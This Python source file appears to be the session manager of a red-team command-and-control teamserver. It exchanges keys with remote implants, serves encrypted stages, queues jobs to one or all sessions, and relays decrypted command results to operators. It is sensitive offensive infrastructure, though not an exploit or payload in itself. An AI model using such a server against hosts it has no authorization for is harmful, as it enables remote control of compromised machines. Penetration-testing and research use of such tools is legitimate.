import core.events as events
import logging
import asyncio
from core.utils import gen_random_string
from core.teamserver.session import Session
from core.teamserver import ipc_server
#from core.teamserver.utils import subscribe, register_subscriptions

"""
The following code sucks.

We can probably pull some really fancy stuff here like registering functions 
using decorators in each Session object so when an event is published
it gets routed directly to the right session with the appropriate GUID.
This would be ideal as it would remove almost all of these helper functions.

I've tried doing this, but it resulted in me drinking a lot with very little success.
"""

#@register_subscriptions
class Sessions:
    name = 'sessions'
    description = 'Sessions menu'

    def __init__(self, teamserver):
        self.teamserver = teamserver
        self.selected = None
        self.sessions = set()

        ipc_server.attach(events.KEX, self.kex)
        ipc_server.attach(events.ENCRYPT_STAGE, self.gen_encrypted_stage)
        ipc_server.attach(events.SESSION_STAGED, self.notify_session_staged)
        ipc_server.attach(events.SESSION_CHECKIN, self.session_checked_in)
        ipc_server.attach(events.NEW_JOB, self.add_job)
        ipc_server.attach(events.JOB_RESULT, self.job_result)

    #@subscribe(events.KEX)
    def kex(self, kex_tuple):
        guid, remote_addr, pubkey_xml = kex_tuple

        try:
            session = self.get(guid)
            logging.debug(f"Creating new pub/priv keys for {guid}")
            session.jobs.set_peer_public_key(pubkey_xml)
        except IndexError:
            logging.debug(f"New kex from {remote_addr} ({guid})")
            session = Session(guid, remote_addr, pubkey_xml)
            self.sessions.add(session)

        return session.jobs.public_key

    #@subscribe(events.ENCRYPT_STAGE)
    def gen_encrypted_stage(self, info_tuple):
        guid, _, comms = info_tuple
        session = self.get(guid)
        return session.jobs.get_encrypted_stage(comms)

    #@subscribe(events.SESSION_STAGED)
    def notify_session_staged(self, msg):
        #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
        asyncio.run_coroutine_threadsafe(
                self.teamserver.users.broadcast_event(
                    events.SESSION_STAGED, 
                    msg
            ),
            loop=self.teamserver.loop
        )

    #@subscribe(events.SESSION_CHECKIN)
    def session_checked_in(self, checkin_tuple):
        guid, _ = checkin_tuple

        session = self.get(guid)
        session.checked_in()

        return session.jobs.get()

    #@subscribe(events.NEW_JOB)
    def add_job(self, job_tuple):
        guid, job = job_tuple
        if guid.lower() == 'all':
            for session in self.sessions:
                session.jobs.add(job)
        else:
            try:
                session = self.get(guid)
                session.jobs.add(job)
            except IndexError:
                logging.error(f"No session was found with name: {guid}")

    #@subscribe(events.JOB_RESULT)
    def job_result(self, result_tuple):
        guid, job_id, data = result_tuple
        session = self.get(guid)
        decrypted_job_results = session.jobs.results(job_id, data)

        if not session.info and decrypted_job_results['cmd'] == 'CheckIn':
            session.info = decrypted_job_results['result']
            logging.debug(f"New session {session.guid} connected! ({session.address})")

            #Since these methods get called from a seperate OS thread in ipc_server, we must use asyncio.run_coroutine_threadsafe()
            asyncio.run_coroutine_threadsafe(
                    self.teamserver.users.broadcast_event(
                        events.NEW_SESSION, 
                        f"New session {session.guid} connected! ({session.address})"
                ),
                loop=self.teamserver.loop
            )

            asyncio.run_coroutine_threadsafe(
                self.teamserver.update_user_stats(),
                loop=self.teamserver.loop
            )
        else:
            logging.debug(f"{session.guid} returned job/command result (id: {job_id})")

            asyncio.run_coroutine_threadsafe(
                    self.teamserver.users.broadcast_event(
                        events.JOB_RESULT, 
                        {'id': job_id, 'output': decrypted_job_results['result'], 'session': session.guid, 'address': session.address}
                ),
                loop=self.teamserver.loop
            )

    def get(self, guid):
        return list(filter(lambda x: x == guid, self.sessions))[0]

    def list(self):
        return {s.guid: dict(s) for s in self.sessions if s.info}
    
    def info(self, guid):
        return dict(self.get(guid))

    def __iter__(self):
        yield ('active', len(self.sessions))
    
    def __str__(self):
        return self.__class__.__name__.lower()
